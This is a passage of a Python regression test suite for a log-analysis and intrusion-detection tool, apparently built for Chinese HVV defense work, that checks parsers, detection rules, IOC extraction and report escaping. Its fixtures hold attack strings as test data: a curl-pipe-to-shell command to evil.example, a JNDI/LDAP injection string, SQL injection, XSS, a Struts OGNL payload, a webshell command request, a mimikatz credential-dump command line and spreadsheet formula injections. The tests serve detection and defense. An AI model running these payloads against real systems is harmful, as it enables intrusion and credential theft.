import csv
import io
import json as _json
import subprocess
import sys
import tempfile
import unittest
import warnings
from unittest import mock
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from bla.__version__ import __version__
from bla.allowlist import apply_allowlist
from bla.config import THRESHOLDS, Thresholds, load_thresholds, set_thresholds
from bla.core import AnalysisError, AnalysisOptions, run_analysis
from bla.detection import DetectorRegistry, DetectorSpec, list_detector_names, run_detection
from bla.detection.engine import _dedup_alerts
from bla.ioc import extract_iocs, format_ioc_report
from bla.log_sources import LOG_SOURCE_PRIORITIES, format_log_source_priorities
from bla.models import (
    AnalysisSummary,
    DetectionAlert,
    LogEvent,
    ParseResult,
    ParseStats,
    ThreatLevel,
)
from bla.output.bundle import generate_report_bundle
from bla.output.csv_report import generate_csv_report
from bla.output.html_report import generate_html_report
from bla.output.json_report import generate_json_report
from bla.output.sarif_report import generate_sarif_report
from bla.output.terminal import print_terminal_report
from bla.parsers import _parse_generic, auto_parse, list_parser_names, parse_content
from bla.parsers.linux_auth import parse_linux_auth
from bla.parsers.p0_security import parse_p0_security_json, parse_p0_security_lines
from bla.parsers.web_access import parse_web_access
from bla.parsers.windows_evtx import _parse_xml_event, parse_windows_xml
from bla.rules import reset_rule_cache, set_rule_dirs, validate_web_attack_rules
from bla.rules.loader import _parse_simple_yaml
from bla.remote import RemoteWorkspace
from bla.remote.ssh_workspace import _split_workspace_line
from bla.utils.helpers import gen_id, is_private_ip, normalize_timestamp, reset_counter, set_syslog_year


class RegressionTests(unittest.TestCase):
    def test_log_source_priorities_capture_ir_collection_order(self):
        sources = [(item.name, item.importance) for item in LOG_SOURCE_PRIORITIES]
        categories = {item.category for item in LOG_SOURCE_PRIORITIES}
        priorities = [item.priority for item in LOG_SOURCE_PRIORITIES]

        self.assertGreaterEqual(len(sources), 40)
        self.assertEqual(sources[:4], [
            ("WAF / Web 安全网关日志", "极高"),
            ("CDN / SLB / 反向代理访问日志", "极高"),
            ("Web 服务器 access.log", "极高"),
            ("业务应用日志", "极高"),
        ])
        self.assertEqual(priorities[:18], ["P0"] * 18)
        self.assertIn(("VPN / SSL VPN / 零信任登录日志", "极高"), sources)
        self.assertIn(("云平台审计日志", "极高"), sources)
        self.assertIn(("Webshell 查杀 / 文件完整性日志", "高"), sources)
        self.assertIn("云与容器", categories)
        self.assertIn("数据与中间件", categories)
        self.assertIn("平台与运营", categories)

    def test_log_source_priority_table_is_markdown(self):
        table = format_log_source_priorities()

        self.assertIn("| 优先级 | 类别 | 类型 | 日志源 | 重要性 | 必备字段 | 研判重点 | 建议时间窗 |", table)
        self.assertIn("| P0 | 边界入口 | 日志源 | WAF / Web 安全网关日志 | 极高 |", table)
        self.assertIn("| P1 | Web 与应用 | 日志源 | Web 服务器 error.log | 高 |", table)
        self.assertIn("云账号接管", table)
        self.assertIn("P0=第一轮必采", table)

    def test_p0_waf_csv_detects_web_attack(self):
        content = (
            "time,src_ip,host,method,uri,action,rule_id,attack_type,status,user_agent\n"
            "2024-03-15 10:00:00,8.8.8.8,www.example.com,GET,"
            "\"/login?id=1 UNION SELECT NULL--\",block,942100,SQL Injection,403,sqlmap\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "waf.csv", parser_hint="csv")

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        event = result.events[0]
        self.assertEqual(event.category, "Web攻击")
        self.assertEqual(event.rule_name, "SQL注入")
        self.assertIn("web-attack", event.tags)
        self.assertIn("waf", event.tags)

    def test_p0_vpn_jsonl_feeds_brute_force_detection(self):
        lines = [
            _json.dumps({
                "log_type": "vpn",
                "time": f"2024-03-15 10:00:{i:02d}",
                "user": "alice",
                "src_ip": "8.8.4.4",
                "result": "failed",
                "reason": "bad password",
            })
            for i in range(5)
        ]

        result = parse_p0_security_lines(lines, "vpn.jsonl")
        summary = run_detection(result.events)

        self.assertEqual(len(result.events), 5)
        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_p0_bastion_key_value_detects_risky_command(self):
        line = (
            'time="2024-03-15 10:01:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 '
            'command="curl http://evil.example/a.sh | sh" result=success'
        )

        result = parse_p0_security_lines([line], "bastion.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "堡垒机高危命令")
        self.assertIn("bastion-command", result.events[0].tags)
        self.assertEqual(result.events[0].host, "10.0.0.5")

    def test_p0_dns_key_value_detects_tunnel_like_query(self):
        line = (
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR"
        )

        result = parse_p0_security_lines([line], "dns.log")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "DNS 隧道/高熵域名")
        self.assertIn("dns-tunnel", result.events[0].tags)

    def test_p0_firewall_csv_detects_allowed_sensitive_port(self):
        content = (
            "time,src_ip,dst_ip,dst_port,action,protocol\n"
            "2024-03-15 10:03:00,203.0.113.9,10.0.0.9,3389,allow,tcp\n"
        )

        result = parse_p0_security_lines(content.splitlines(), "firewall.csv", parser_hint="csv")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "防火墙放行敏感端口访问")
        self.assertIn("firewall", result.events[0].tags)
        self.assertEqual(result.events[0].port, 3389)

    def test_p0_edr_json_detects_credential_dumping(self):
        content = _json.dumps([{
            "log_type": "edr",
            "time": "2024-03-15 10:04:00",
            "host": "win-01",
            "user": "bob",
            "severity": "critical",
            "alert": "Mimikatz credential dumping",
            "process": "mimikatz.exe",
            "commandline": "sekurlsa::logonpasswords",
        }])

        result = parse_p0_security_json(content, "edr.json")

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].level, ThreatLevel.CRITICAL)
        self.assertIn("malware-indicator", result.events[0].tags)
        self.assertIn("lsass-dump", result.events[0].tags)

    def test_auto_parse_p0_application_log_detects_exploit_trace(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "application.log"
            path.write_text(
                "2024-03-15 10:05:00 ERROR request failed: ${jndi:ldap://evil.example/a}\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "P0 Security Log (HVV/重保)")
        self.assertEqual(len(result.events), 1)
        self.assertIn("web-attack", result.events[0].tags)

    def test_p0_security_events_are_promoted_to_alerts(self):
        lines = [
            "time=2024-03-15T10:02:00 log_type=dns client_ip=10.0.0.8 "
            "query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example rcode=NOERROR",
            'time="2024-03-15 10:03:00" type=bastion user=admin '
            'src_ip=1.1.1.1 target_host=10.0.0.5 command="curl http://evil.example/a.sh | sh"',
            "time=2024-03-15T10:04:00 log_type=firewall src_ip=203.0.113.9 "
            "dst_ip=10.0.0.9 dst_port=3389 action=allow protocol=tcp",
        ]

        result = parse_p0_security_lines(lines, "p0.log")
        summary = run_detection(result.events)
        rule_ids = {alert.rule_id for alert in summary.alerts}

        self.assertIn("P0-C2-001", rule_ids)
        self.assertIn("P0-BASTION-001", rule_ids)
        self.assertIn("P0-FW-001", rule_ids)

    def test_web_payload_with_spaces_is_detected_as_sqli(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /login.php?id=1 UNION SELECT NULL-- HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "SQL注入")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_name == "Web攻击: SQL注入" for alert in summary.alerts))

    def test_high_frequency_success_requests_create_volume_alert(self):
        content = "".join(
            "1.1.1.1 - - [15/Mar/2024:10:00:%02d +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n" % (i % 60)
            for i in range(120)
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "自动化扫描/高频访问")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))

    def test_html_report_escapes_attacker_controlled_content_and_stays_offline(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("<script>alert(1)</script>", html)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", html)
        self.assertNotIn("cdn.jsdelivr", html)
        self.assertNotIn("new Chart", html)

    def test_html_report_escapes_windows_logon_summary_fields(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">&lt;img src=x onerror=alert(1)&gt;</Data>"
            "<Data Name=\"TargetDomainName\">ACME</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">3</Data>"
            "<Data Name=\"FailureReason\">bad</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "security.xml")
        summary = run_detection(result.events)

        with tempfile.TemporaryDirectory() as tmp:
            report_path = Path(tmp) / "report.html"
            generate_html_report([result], summary, str(report_path))
            html = report_path.read_text(encoding="utf-8")

        self.assertNotIn("<img src=x onerror=alert(1)>", html)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", html)

    def test_csv_report_neutralizes_spreadsheet_formulas(self):
        event = LogEvent(
            id="evt-1",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="=HYPERLINK(\"http://evil.test\")",
            raw_line="-2+3",
            user="+cmd",
            host="@host",
            process="\t=calc",
            details={"command": " @SUM(1+1)", "url": "https://example.test/path"},
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1))
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=1,
            files_analyzed=1,
        )

        with tempfile.TemporaryDirectory() as tmp:
            csv_path = Path(tmp) / "events.csv"
            generate_csv_report([result], summary, str(csv_path))
            with open(csv_path, newline="", encoding="utf-8-sig") as f:
                row = next(csv.DictReader(f))

        self.assertEqual(row["message"], "'=HYPERLINK(\"http://evil.test\")")
        self.assertEqual(row["user"], "'+cmd")
        self.assertEqual(row["host"], "'@host")
        self.assertEqual(row["process"], "'\t=calc")
        self.assertEqual(row["command"], "' @SUM(1+1)")
        self.assertEqual(row["raw_line"], "'-2+3")
        self.assertEqual(row["url"], "https://example.test/path")

    def test_windows_event_with_malformed_logon_type_is_not_dropped(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">-</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4625")
        self.assertEqual(event.user, "bob")

    def test_windows_successful_logon_feeds_cn_hvv_success_after_bruteforce(self):
        xml = "".join(
            "<Event><System><EventID>4625</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">8.8.8.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            for i in range(5)
        )
        xml += (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">8.8.8.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
        )

        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any("successful-login" in event.tags for event in result.events if event.event_id == "4624"))
        self.assertTrue(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))

    def test_evtx_missing_python_evtx_blocks_empty_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            evtx_path = Path(tmp) / "Security.evtx"
            evtx_path.write_bytes(b"ElfFile\x00\x00")

            real_import = __import__

            def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
                if name.startswith("Evtx"):
                    raise ImportError("No module named Evtx")
                return real_import(name, globals, locals, fromlist, level)

            with mock.patch("builtins.__import__", side_effect=fake_import):
                with self.assertRaises(AnalysisError) as ctx:
                    run_analysis(AnalysisOptions(paths=[str(evtx_path)]), quiet=True)

        msg = str(ctx.exception)
        self.assertIn("python-evtx", msg)
        self.assertIn("未被解析", msg)

    def test_windows_system_account_creation_is_not_persistence_alert(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:33.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">WDAGUtilityAccount</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data>"
            "<Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("account-creation", event.tags)
        self.assertEqual(event.details.get("account_sensitivity"), "system-initialization")

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PERS-003" for alert in summary.alerts))

    def test_windows_low_risk_group_add_does_not_raise_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:40.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Users</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1001</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("privilege-escalation", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "low")
        self.assertIn("S-1-5-21-1-2-3-1001", event.message)

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PRIV-001" for alert in summary.alerts))

    def test_windows_admin_group_add_keeps_operator_and_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("group-add", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "privileged")
        self.assertIn("Builtin\\Administrators", event.message)

        summary = run_detection([event])
        alert = next(a for a in summary.alerts if a.rule_id == "PRIV-001")
        self.assertTrue(any("Administrator" in item for item in alert.evidence))
        self.assertTrue(any("目标组: Builtin\\Administrators" in item for item in alert.evidence))

    def test_windows_new_admin_account_remote_logon_chain_becomes_incident(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"TargetSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4722</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4724</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:14.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"Workstation\">CHINARAN404</Data>"
            "<Data Name=\"Status\">0x0</Data></EventData></Event>"
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"IpAddress\">192.168.126.1</Data>"
            "<Data Name=\"WorkstationName\">CHINARAN404</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events)

        chain = next(alert for alert in summary.alerts if alert.rule_id == "WIN-CHAIN-001")
        self.assertEqual(chain.level, ThreatLevel.CRITICAL)
        self.assertTrue(any("来源IP: 192.168.126.1" in item for item in chain.evidence))
        self.assertTrue(any("来源工作站: CHINARAN404" in item for item in chain.evidence))
        top = summary.incidents[0]
        self.assertIn("可疑本地管理员账号与远程登录", top.title)
        self.assertEqual(top.confidence, "high")
        self.assertIn("192.168.126.1", top.source_ips)
        self.assertIn("WIN-N8G63QC50SQ\\hack168$", top.accounts)
        self.assertIn("持久化", top.attack_phases)
        self.assertIn("权限提升", top.attack_phases)
        self.assertIn("远程访问", top.attack_phases)

    def test_windows_4688_process_creation_is_not_generic_t1059(self):
        xml = (
            "<Event><System><EventID>4688</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"NewProcessName\">C:\\Windows\\System32\\smss.exe</Data>"
            "<Data Name=\"ParentProcessName\">System</Data>"
            "<Data Name=\"CommandLine\">smss.exe</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        event = result.events[0]
        self.assertIsNone(event.mitre_attack)
        self.assertIn("process-creation", event.tags)

        summary = run_detection(result.events)
        self.assertFalse(any(item.phase == "执行" for item in summary.attack_chain))

    def test_windows_ntlm_success_zero_status_is_not_bruteforce(self):
        xml = (
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"Workstation\">WS01</Data>"
            "<Data Name=\"Status\">0x00000000</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertIn("auth-success", event.tags)
        self.assertIsNone(event.mitre_attack)

    def test_simple_yaml_regex_quotes_do_not_emit_escape_warnings(self):
        text = """
web_attacks:
  - id: WEB-WARN
    name: warning fixture
    level: high
    mitre: T1190
    tags: [web-attack]
    patterns:
      - '\\$\\{jndi:'
      - 'openapi\\.json'
"""
        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            data = _parse_simple_yaml(text)

        self.assertEqual(data["web_attacks"][0]["patterns"][0], "\\$\\{jndi:")
        self.assertFalse(any(item.category is SyntaxWarning for item in caught))

    def test_local_machine_explicit_creds_do_not_become_pass_the_hash(self):
        xml = "".join(
            "<Event><System><EventID>4648</EventID>"
            f"<TimeCreated SystemTime=\"2026-05-13T00:44:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data>"
            "<Data Name=\"TargetServerName\">localhost</Data>"
            "<Data Name=\"TargetUserName\">MINWINPC$</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data></EventData></Event>"
            for i in range(3)
        )
        result = parse_windows_xml(xml, "Security.xml")
        self.assertEqual(len(result.events), 3)
        self.assertTrue(all("local-explicit-creds" in event.tags for event in result.events))
        self.assertTrue(all("explicit-creds" not in event.tags for event in result.events))

        summary = run_detection(result.events)
        self.assertFalse(any(alert.rule_id == "LAT-002" for alert in summary.alerts))

    def test_syslog_year_can_be_overridden_for_historical_logs(self):
        try:
            set_syslog_year(2024)
            self.assertEqual(normalize_timestamp("Mar 15 09:00:01"), "2024-03-15T09:00:01")
        finally:
            set_syslog_year(None)

    def test_cn_hvv_profile_detects_common_domestic_exploit_traces(self):
        content = (
            "2.2.2.2 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.action?redirect:%24%7B%23_memberAccess%5B%27allowStaticMethodAccess%27%5D=true%7D HTTP/1.1\" "
            "200 10 \"-\" \"curl/8.0\"\n"
            "2.2.2.3 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )

        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any(alert.rule_id == "CN-HVV-001" for alert in summary.alerts))
        self.assertTrue(any("cn-hvv" in event.tags for event in result.events))

    def test_ioc_extraction_and_text_export(self):
        content = (
            "3.3.3.3 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 "
            "\"http://evil.example/a\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")

        iocs = extract_iocs(result.events)
        report = format_ioc_report(iocs)

        self.assertIn("3.3.3.3", iocs["ips"])
        self.assertIn("evil.example", iocs["domains"])
        self.assertIn("/upload/shell.jsp", iocs["file_paths"])
        self.assertIn("## IP", report)

    def test_allowlist_suppresses_trusted_noise_before_detection(self):
        content = (
            "10.0.0.5 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /health HTTP/1.1\" 403 10 \"-\" \"ELB-HealthChecker\"\n"
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /admin.php HTTP/1.1\" 403 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")

        filtered, suppressed = apply_allowlist([result], {
            "ips": ["10.0.0.5"],
            "paths": ["/health"],
            "user_agents": ["ELB-HealthChecker"],
        })

        self.assertEqual(suppressed, 1)
        self.assertEqual(len(filtered[0].events), 1)
        self.assertEqual(filtered[0].events[0].ip, "9.9.9.9")

    def test_empty_allowlist_objects_do_not_suppress_everything(self):
        event = LogEvent(
            id="evt-allow-1",
            timestamp="2024-03-15T10:00:00",
            level=ThreatLevel.HIGH,
            category="测试",
            source="fixture",
            source_file="events.log",
            message="danger",
            raw_line="danger",
        )
        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, high=1))

        for allowlist in ({"suppressions": [{}]}, {"maintenance_windows": [{}]}):
            filtered, suppressed = apply_allowlist([result], allowlist)
            self.assertEqual(suppressed, 0)
            self.assertEqual(len(filtered[0].events), 1)

    def test_terminal_report_can_cap_large_alert_lists(self):
        content = "".join(
            "%d.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /wp-login.php HTTP/1.1\" 404 10 \"-\" \"Mozilla/5.0\"\n" % i
            for i in range(1, 12)
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True, max_alerts=1)
        finally:
            sys.stdout = old_stdout

        self.assertIn("终端仅展示前 1 个告警", buf.getvalue())

    def test_terminal_report_filters_placeholder_top_ip_and_shows_utc8(self):
        result = ParseResult(
            "security.xml",
            "Fixture",
            [],
            ParseStats(
                total=2,
                top_ips=[{"ip": "192.168.126.1", "count": 6}],
                top_local_ips=[{"ip": "-", "count": 233}],
                time_start="2024-02-26T15:01:13+00:00",
                time_end="2024-02-26T15:02:24+00:00",
            ),
        )
        summary = AnalysisSummary(
            risk_score=0,
            risk_level=ThreatLevel.INFO,
            alerts=[],
            timeline=[],
            attack_chain=[],
            recommendations=[],
            total_events=0,
            files_analyzed=1,
        )

        buf = io.StringIO()
        old_stdout = sys.stdout
        try:
            sys.stdout = buf
            print_terminal_report([result], summary, no_color=True)
        finally:
            sys.stdout = old_stdout
        text = buf.getvalue()
        self.assertIn("2024-02-26 23:01:13 UTC+8", text)
        self.assertIn("UTC: 2024-02-26T15:01:13Z", text)
        self.assertIn("有效远程源 IP", text)
        self.assertIn("192.168.126.1", text)
        self.assertIn("本机/空来源", text)

    # ---- 新增：本轮重构覆盖的回归点 -----------------------------------

    def test_dedup_keeps_distinct_alerts_with_same_description_prefix(self):
        """description 前 50 字相同但 affected_events 不同的告警必须保留。"""
        alert_a = DetectionAlert(
            id="a1", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e1", "e2"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        alert_b = DetectionAlert(
            id="a2", rule_id="WEB-SQLI", rule_name="SQL注入",
            description="检测到 5 次 SQL注入 攻击尝试 ……长描述同前缀",
            level=ThreatLevel.HIGH, category="Web攻击",
            mitre_attack="T1190", mitre_phase="初始访问",
            affected_events=["e3"], evidence=[],
            recommendation="", timestamp="", confidence="high",
        )
        result = _dedup_alerts([alert_a, alert_b])
        self.assertEqual(len(result), 2)
        self.assertEqual({a.id for a in result}, {"a1", "a2"})

    def test_iocs_filter_to_alert_related_events_only(self):
        """正常业务流量不应该污染 IOC 列表，只有告警涉及的事件才贡献 IOC。"""
        content = (
            # 1) 正常业务流量
            "10.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /index.html HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
            # 2) Webshell 攻击（会触发 web-attack 告警）
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"POST /upload/shell.jsp?cmd=whoami HTTP/1.1\" 200 10 \"-\" \"Behinder\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        iocs = extract_iocs(result.events, alerts=summary.alerts)
        self.assertIn("9.9.9.9", iocs["ips"])
        self.assertNotIn("10.0.0.1", iocs["ips"],
                         "业务流量 IP 不应该出现在告警过滤后的 IOC 中")

    def test_private_source_ip_downgrades_brute_force_confidence(self):
        """私网 IP 触发的暴力破解告警 confidence 应当被降级。"""
        # 构造 25 条来自 192.168 私网的 SSH 失败登录
        lines = [
            f"Mar 15 09:00:{i:02d} host sshd[1234]: Failed password for bob from 192.168.10.5 port 22 ssh2"
